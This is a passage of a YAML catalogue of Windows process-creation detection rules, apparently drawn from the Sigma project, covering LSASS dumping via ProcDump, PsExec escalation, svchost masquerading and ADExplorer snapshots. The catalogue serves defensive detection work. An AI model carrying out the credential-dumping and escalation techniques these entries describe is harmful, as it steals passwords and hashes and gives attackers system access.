- detection_id: 05f3c945-dcc8-4393-9f3d-af65077a8f86
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_sysvol_access.yml
  name: Suspicious SYSVOL Domain Group Policy Access
  description: Detects Access to Domain Group Policies stored in SYSVOL
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1552.006
  tags:
  - attack.credential-access
  - attack.t1552.006
  time_window: ''
  references:
  - https://adsecurity.org/?p=2288
  - https://www.hybrid-analysis.com/sample/f2943f5e45befa52fb12748ca7171d30096e1d4fc3c365561497c618341299d5?environmentId=100
  false_positives:
  - Administrative activity
  notes: ''
- detection_id: cc4e02ba-9c06-48e2-b09e-2500cace9ae0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_task_folder_evasion.yml
  name: Tasks Folder Evasion
  description: 'The Tasks folder in system32 and syswow64 are globally writable paths.

    Adversaries can take advantage of this and load or influence any script hosts
    or ANY .NET Application

    in Tasks to load and execute a custom assembly into cscript, wscript, regsvr32,
    mshta, eventvwr

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.persistence
  - attack.execution
  - attack.t1574.001
  time_window: ''
  references:
  - https://twitter.com/subTee/status/1216465628946563073
  - https://gist.github.com/am0nsec/8378da08f848424e4ab0cc5b317fdd26
  false_positives:
  - Unknown
  notes: ''
- detection_id: 634b00d5-ccc3-4a06-ae3b-0ec8444dd51b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_use_of_te_bin.yml
  name: Malicious Windows Script Components File Execution by TAEF Detection
  description: 'Windows Test Authoring and Execution Framework (TAEF) framework allows
    you to run automation by executing tests files written on different languages
    (C, C#, Microsoft COM Scripting interfaces

    Adversaries may execute malicious code (such as WSC file with VBScript, dll and
    so on) directly by running te.exe

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Te/
  - https://twitter.com/pabraeken/status/993298228840992768
  - https://learn.microsoft.com/en-us/windows-hardware/drivers/taef/
  false_positives:
  - It's not an uncommon to use te.exe directly to execute legal TAEF tests
  notes: ''
- detection_id: 15c7904e-6ad1-4a45-9b46-5fb25df37fd2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_use_of_vsjitdebugger_bin.yml
  name: Malicious PE Execution by Microsoft Visual Studio Debugger
  description: 'There is an option for a MS VS Just-In-Time Debugger "vsjitdebugger.exe"
    to launch specified executable and attach a debugger.

    This option may be used adversaries to execute malicious code by signed verified
    binary.

    The debugger is installed alongside with Microsoft Visual Studio package.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.t1218
  - attack.defense-evasion
  time_window: ''
  references:
  - https://twitter.com/pabraeken/status/990758590020452353
  - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Vsjitdebugger/
  - https://learn.microsoft.com/en-us/visualstudio/debugger/debug-using-the-just-in-time-debugger?view=vs-2019
  false_positives:
  - The process spawned by vsjitdebugger.exe is uncommon.
  notes: ''
- detection_id: b655a06a-31c0-477a-95c2-3726b83d649d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_userinit_child.yml
  name: Suspicious Userinit Child Process
  description: Detects a suspicious child process of userinit
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1055
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.t1055
  time_window: ''
  references:
  - https://twitter.com/SBousseaden/status/1139811587760562176
  false_positives:
  - Administrative scripts
  notes: ''
- detection_id: 4bc90587-e6ca-4b41-be0b-ed4d04e4ed0c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_velociraptor_child_process.yml
  name: Suspicious Velociraptor Child Process
  description: Detects the suspicious use of the Velociraptor DFIR tool to execute
    other tools or download additional payloads, as seen in a campaign where it was
    abused for remote access and to stage further attacks.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1219
  tags:
  - attack.command-and-control
  - attack.persistence
  - attack.defense-evasion
  - attack.t1219
  time_window: ''
  references:
  - https://news.sophos.com/en-us/2025/08/26/velociraptor-incident-response-tool-abused-for-remote-access/
  false_positives:
  - Legitimate administrators or incident responders might use Velociraptor to execute
    scripts or tools. However, the combination of Velociraptor spawning these specific
    processes with these command lines is suspicious. Tuning may be required to exclude
    known administrative actions or specific scripts.
  notes: ''
- detection_id: 91edcfb1-2529-4ac2-9ecc-7617f895c7e4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_weak_or_abused_passwords.yml
  name: Weak or Abused Passwords In CLI
  description: 'Detects weak passwords or often abused passwords (seen used by threat
    actors) via the CLI.

    An example would be a threat actor creating a new user via the net command and
    providing the password inline

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.defense-evasion
  - attack.execution
  time_window: ''
  references:
  - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/espionage-asia-governments
  - https://thedfirreport.com/2022/09/26/bumblebee-round-two/
  - https://www.microsoft.com/en-us/security/blog/2022/10/25/dev-0832-vice-society-opportunistic-ransomware-campaigns-impacting-us-education-sector/
  - https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708
  false_positives:
  - Legitimate usage of the passwords by users via commandline (should be discouraged)
  - Other currently unknown false positives
  notes: ''
- detection_id: 9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_web_request_cmd_and_cmdlets.yml
  name: Usage Of Web Request Commands And Cmdlets
  description: Detects the use of various web request commands with commandline tools
    and Windows PowerShell cmdlets (including aliases) via CommandLine
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/
  - https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell
  - https://learn.microsoft.com/en-us/powershell/module/bitstransfer/add-bitsfile?view=windowsserver2019-ps
  false_positives:
  - Use of Get-Command and Get-Help modules to reference Invoke-WebRequest and Start-BitsTransfer.
  notes: ''
- detection_id: e9142d84-fbe0-401d-ac50-3e519fb00c89
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_whoami_as_param.yml
  name: WhoAmI as Parameter
  description: Detects a suspicious process command line that uses whoami as first
    parameter (as e.g. used by EfsPotato)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1033
  tags:
  - attack.discovery
  - attack.t1033
  - car.2016-03-001
  time_window: ''
  references:
  - https://twitter.com/blackarrowsec/status/1463805700602224645?s=12
  false_positives:
  - Unknown
  notes: ''
- detection_id: 0bbc6369-43e3-453d-9944-cae58821c173
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_workfolders.yml
  name: Execution via WorkFolders.exe
  description: Detects using WorkFolders.exe to execute an arbitrary control.exe
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://twitter.com/elliotkillick/status/1449812843772227588
  false_positives:
  - Legitimate usage of the uncommon Windows Work Folders feature.
  notes: ''
- detection_id: 16c37b52-b141-42a5-a3ea-bbe098444397
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_svchost_execution_with_no_cli_flags.yml
  name: Suspect Svchost Activity
  description: It is extremely abnormal for svchost.exe to spawn without any CLI arguments
    and is normally observed when a malicious process spawns the process and injects
    code into the process memory space.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1055
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1055
  time_window: ''
  references:
  - https://web.archive.org/web/20180718061628/https://securitybytes.io/blue-team-fundamentals-part-two-windows-processes-759fe15965e2
  false_positives:
  - Rpcnet.exe / rpcnetp.exe which is a lojack style software. https://www.blackhat.com/docs/us-14/materials/us-14-Kamlyuk-Kamluk-Computrace-Backdoor-Revisited.pdf
  notes: ''
- detection_id: be58d2e2-06c8-4f58-b666-b99f6dc3b6cd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_svchost_masqueraded_execution.yml
  name: Suspicious Process Masquerading As SvcHost.EXE
  description: 'Detects a suspicious process that is masquerading as the legitimate
    "svchost.exe" by naming its binary "svchost.exe" and executing from an uncommon
    location.

    Adversaries often disguise their malicious binaries by naming them after legitimate
    system processes like "svchost.exe" to evade detection.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1036.005
  tags:
  - attack.defense-evasion
  - attack.t1036.005
  time_window: ''
  references:
  - https://tria.ge/240731-jh4crsycnb/behavioral2
  - https://redcanary.com/blog/threat-detection/process-masquerading/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 1012f107-b8f1-4271-af30-5aed2de89b39
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_svchost_termserv_proc_spawn.yml
  name: Terminal Service Process Spawn
  description: Detects a process spawned by the terminal service server process (this
    could be an indicator for an exploitation of CVE-2019-0708)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1190
  - T1210
  tags:
  - attack.initial-access
  - attack.t1190
  - attack.lateral-movement
  - attack.t1210
  - car.2013-07-002
  time_window: ''
  references:
  - https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/rdp-stands-for-really-do-patch-understanding-the-wormable-rdp-vulnerability-cve-2019-0708/
  false_positives:
  - Unknown
  notes: ''
- detection_id: f17211f1-1f24-4d0c-829f-31e28dc93cdd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_svchost_uncommon_command_line_flags.yml
  name: Uncommon Svchost Command Line Parameter
  description: 'Detects instances of svchost.exe running with an unusual or uncommon
    command line parameter by excluding known legitimate or common patterns.

    This could point at a file masquerading as svchost, a process injection, or hollowing
    of a legitimate svchost instance.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1036.005
  - T1055
  - T1055.012
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1036.005
  - attack.t1055
  - attack.t1055.012
  time_window: ''
  references:
  - https://cardinalops.com/blog/the-art-of-anomaly-hunting-patterns-detection/
  - https://www.security.com/threat-intelligence/blackbyte-exbyte-ransomware
  - https://cloud.google.com/blog/topics/threat-intelligence/apt41-initiates-global-intrusion-campaign-using-multiple-exploits/
  - https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08064518/Carbanak_APT_eng.pdf
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 01d2e2a1-5f09-44f7-9fc1-24faa7479b6d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_svchost_uncommon_parent_process.yml
  name: Uncommon Svchost Parent Process
  description: Detects an uncommon svchost parent process
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1036.005
  tags:
  - attack.defense-evasion
  - attack.t1036.005
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Unknown
  notes: ''
- detection_id: c625d754-6a3d-4f65-9c9a-536aea960d37
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_sysinternals_accesschk_check_permissions.yml
  name: Permission Check Via Accesschk.EXE
  description: Detects the usage of the "Accesschk" utility, an access and privilege
    audit tool developed by SysInternal and often being abused by attacker to verify
    process privileges
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1069.001
  tags:
  - attack.discovery
  - attack.t1069.001
  time_window: ''
  references:
  - https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment?slide=43
  - https://www.youtube.com/watch?v=JGs-aKf2OtU&ab_channel=OFFZONEMOSCOW
  - https://github.com/carlospolop/PEASS-ng/blob/fa0f2e17fbc1d86f1fd66338a40e665e7182501d/winPEAS/winPEASbat/winPEAS.bat
  - https://github.com/gladiatx0r/Powerless/blob/04f553bbc0c65baf4e57344deff84e3f016e6b51/Powerless.bat
  false_positives:
  - System administrator Usage
  notes: ''
- detection_id: 9212f354-7775-4e28-9c9f-8f0a4544e664
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_sysinternals_adexplorer_execution.yml
  name: Active Directory Database Snapshot Via ADExplorer
  description: Detects the execution of Sysinternals ADExplorer with the "-snapshot"
    flag in order to save a local copy of the active directory database. This can
    be used by attackers to extract data for Bloodhound, usernames for password spraying
    or use the meta data for social engineering. The snapshot doesn't contain password
    hashes but there have been cases, where administrators put passwords in the comment
    field.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1069.002
  - T1087.002
  - T1482
  tags:
  - attack.discovery
  - attack.t1087.002
  - attack.t1069.002
  - attack.t1482
  time_window: ''
  references:
  - https://www.documentcloud.org/documents/5743766-Global-Threat-Report-2019.html
  - https://learn.microsoft.com/de-de/sysinternals/downloads/adexplorer
  - https://github.com/c3c/ADExplorerSnapshot.py/tree/f700904defac330802bbfedd1d8ffd9248f4ee24
  - https://www.packetlabs.net/posts/scattered-spider-is-a-young-ransomware-gang-exploiting-large-corporations/
  - https://www.nccgroup.com/us/research-blog/lapsus-recent-techniques-tactics-and-procedures/
  - https://trustedsec.com/blog/adexplorer-on-engagements
  false_positives:
  - Unknown
  notes: ''
- detection_id: ef61af62-bc74-4f58-b49b-626448227652
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_sysinternals_adexplorer_susp_execution.yml
  name: Suspicious Active Directory Database Snapshot Via ADExplorer
  description: Detects the execution of Sysinternals ADExplorer with the "-snapshot"
    flag in order to save a local copy of the active directory database to a suspicious
    directory. This can be used by attackers to extract data for Bloodhound, usernames
    for password spraying or use the meta data for social engineering. The snapshot
    doesn't contain password hashes but there have been cases, where administrators
    put passwords in the comment field.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1069.002
  - T1087.002
  - T1482
  tags:
  - attack.discovery
  - attack.t1087.002
  - attack.t1069.002
  - attack.t1482
  time_window: ''
  references:
  - https://www.documentcloud.org/documents/5743766-Global-Threat-Report-2019.html
  - https://learn.microsoft.com/de-de/sysinternals/downloads/adexplorer
  - https://github.com/c3c/ADExplorerSnapshot.py/tree/f700904defac330802bbfedd1d8ffd9248f4ee24
  - https://www.packetlabs.net/posts/scattered-spider-is-a-young-ransomware-gang-exploiting-large-corporations/
  - https://www.nccgroup.com/us/research-blog/lapsus-recent-techniques-tactics-and-procedures/
  - https://trustedsec.com/blog/adexplorer-on-engagements
  false_positives:
  - Unknown
  notes: ''
- detection_id: 7cccd811-7ae9-4ebe-9afd-cb5c406b824b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_sysinternals_eula_accepted.yml
  name: Potential Execution of Sysinternals Tools
  description: Detects command lines that contain the 'accepteula' flag which could
    be a sign of execution of one of the Sysinternals tools
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1588.002
  tags:
  - attack.resource-development
  - attack.t1588.002
  time_window: ''
  references:
  - https://twitter.com/Moti_B/status/1008587936735035392
  false_positives:
  - Legitimate use of SysInternals tools
  - Programs that use the same command line flag
  notes: ''
- detection_id: a85f7765-698a-4088-afa0-ecfbf8d01fa4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_sysinternals_livekd_execution.yml
  name: Potential Memory Dumping Activity Via LiveKD
  description: Detects execution of LiveKD based on PE metadata or image name
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/sysinternals/downloads/livekd
  false_positives:
  - Administration and debugging activity (must be investigated)
  notes: ''
- detection_id: c7746f1c-47d3-43d6-8c45-cd1e54b6b0a2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_sysinternals_livekd_kernel_memory_dump.yml
  name: Kernel Memory Dump Via LiveKD
  description: Detects execution of LiveKD with the "-m" flag to potentially dump
    the kernel memory
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/sysinternals/downloads/livekd
  - https://4sysops.com/archives/creating-a-complete-memory-dump-without-a-blue-screen/
  - https://kb.acronis.com/content/60892
  false_positives:
  - Unlikely in production environment
  notes: ''
- detection_id: 2e65275c-8288-4ab4-aeb7-6274f58b6b20
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_sysinternals_procdump.yml
  name: Procdump Execution
  description: Detects usage of the SysInternals Procdump utility
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  - T1036
  tags:
  - attack.defense-evasion
  - attack.t1036
  - attack.t1003.001
  - attack.credential-access
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/sysinternals/downloads/procdump
  false_positives:
  - Legitimate use of procdump by a developer or administrator
  notes: ''
- detection_id: 79b06761-465f-4f88-9ef2-150e24d3d737
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_sysinternals_procdump_evasion.yml
  name: Potential SysInternals ProcDump Evasion
  description: Detects uses of the SysInternals ProcDump utility in which ProcDump
    or its output get renamed, or a dump file is moved or copied to a different name
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  - T1036
  tags:
  - attack.defense-evasion
  - attack.t1036
  - attack.t1003.001
  - attack.credential-access
  time_window: ''
  references:
  - https://twitter.com/mrd0x/status/1480785527901204481
  false_positives:
  - False positives are expected in cases in which ProcDump just gets copied to a
    different directory without any renaming
  notes: ''
- detection_id: 5afee48e-67dd-4e03-a783-f74259dcf998
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_sysinternals_procdump_lsass.yml
  name: Potential LSASS Process Dump Via Procdump
  description: 'Detects potential credential harvesting attempts through LSASS memory
    dumps using ProcDump.

    This rule identifies suspicious command-line patterns that combine memory dump
    flags (-ma, -mm, -mp) with LSASS-related process markers.

    LSASS (Local Security Authority Subsystem Service) contains sensitive authentication
    data including plaintext passwords, NTLM hashes, and Kerberos tickets in memory.

    Attackers commonly dump LSASS memory to extract credentials for lateral movement
    and privilege escalation.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: high
  status: stable
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  - T1036
  tags:
  - attack.defense-evasion
  - attack.t1036
  - attack.credential-access
  - attack.t1003.001
  - car.2013-05-009
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/sysinternals/downloads/procdump
  - https://research.splunk.com/endpoint/3742ebfe-64c2-11eb-ae93-0242ac130002
  - https://x.com/wietze/status/1958302556033065292?s=12
  false_positives:
  - Unlikely, because no one should dump an lsass process memory
  - Another tool that uses command line flags similar to ProcDump
  notes: ''
- detection_id: 730fc21b-eaff-474b-ad23-90fd265d4988
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_sysinternals_psexec_execution.yml
  name: Psexec Execution
  description: Detects user accept agreement execution in psexec commandline
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1021
  - T1569
  tags:
  - attack.execution
  - attack.lateral-movement
  - attack.t1569
  - attack.t1021
  time_window: ''
  references:
  - https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html
  false_positives:
  - Administrative scripts.
  notes: ''
- detection_id: 8834e2f7-6b4b-4f09-8906-d2276470ee23
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_sysinternals_psexec_paexec_escalate_system.yml
  name: PsExec/PAExec Escalation to LOCAL SYSTEM
  description: Detects suspicious commandline flags used by PsExec and PAExec to escalate
    a command line to LOCAL_SYSTEM rights
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1587.001
  tags:
  - attack.resource-development
  - attack.t1587.001
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/sysinternals/downloads/psexec
  - https://www.poweradmin.com/paexec/
  - https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html
  false_positives:
  - Admins that use PsExec or PAExec to escalate to the SYSTEM account for maintenance
    purposes (rare)
  - Users that debug Microsoft Intune issues using the commands mentioned in the official
    documentation; see https://learn.microsoft.com/en-us/mem/intune/apps/intune-management-extension
  notes: ''
- detection_id: ea011323-7045-460b-b2d7-0f7442ea6b38
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_sysinternals_psexec_remote_execution.yml
  name: Potential PsExec Remote Execution
  description: Detects potential psexec command that initiate execution on a remote
    systems via common commandline flags used by the utility
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1587.001
  tags:
  - attack.resource-development
  - attack.t1587.001
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/sysinternals/downloads/psexec
  - https://www.poweradmin.com/paexec/
  - https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: fdfcbd78-48f1-4a4b-90ac-d82241e368c5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_sysinternals_psexesvc.yml
  name: PsExec Service Execution
  description: Detects launch of the PSEXESVC service, which means that this system
    was the target of a psexec remote execution
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/sysinternals/downloads/psexec
  - https://www.youtube.com/watch?v=ro2QuZTIMBM
  false_positives:
  - Legitimate administrative tasks
  notes: ''
- detection_id: 7c0dcd3d-acf8-4f71-9570-f448b0034f94
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_sysinternals_psexesvc_as_system.yml
  name: PsExec Service Child Process Execution as LOCAL SYSTEM
  description: Detects suspicious launch of the PSEXESVC service on this system and
    a sub process run as LOCAL_SYSTEM (-s), which means that someone remotely started
    a command on this system running it with highest privileges and not only the privileges
    of the login user account (e.g. the administrator account)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/sysinternals/downloads/psexec
  false_positives:
  - Users that debug Microsoft Intune issues using the commands mentioned in the official
    documentation; see https://learn.microsoft.com/en-us/mem/intune/apps/intune-management-extension
  notes: ''
- detection_id: aae1243f-d8af-40d8-ab20-33fc6d0c55bc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_sysinternals_psloglist.yml
  name: Suspicious Use of PsLogList
  description: Detects usage of the PsLogList utility to dump event log in order to
    extract admin accounts and perform account discovery or delete events logs
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1087
  - T1087.001
  - T1087.002
  tags:
  - attack.discovery
  - attack.t1087
